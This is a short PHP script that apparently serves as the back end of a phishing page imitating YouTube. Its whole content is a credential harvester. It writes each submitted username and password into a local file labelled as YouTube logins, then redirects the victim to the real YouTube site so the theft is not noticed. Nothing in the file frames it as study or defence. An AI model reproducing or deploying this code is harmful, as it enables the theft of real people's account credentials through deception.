<?php

file_put_contents("usernames.txt", "YouTube Email: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.youtube.com');
exit();
?>
